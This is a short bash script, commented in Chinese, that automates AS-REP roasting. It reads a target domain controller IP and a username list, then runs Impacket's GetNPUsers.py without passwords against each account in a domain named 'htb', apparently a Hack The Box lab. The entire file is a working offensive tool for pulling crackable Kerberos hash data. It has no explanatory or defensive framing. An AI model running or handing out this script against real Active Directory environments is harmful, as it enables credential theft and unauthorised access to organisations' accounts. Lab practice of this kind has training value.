#!/bin/bash

# 提示用户输入IP地址
read -p "请输入目标IP地址: " ip

# 提示用户输入包含用户名的文件路径
read -p "请输入包含用户名的文件路径: " user_file

# 遍历文件中的每个用户名并执行 GetNPUsers.py 命令
for user in $(cat $user_file); do
  echo "正在检查用户: $user"
  GetNPUsers.py -no-pass -dc-ip $ip htb/$user | grep -v Impacket
done 

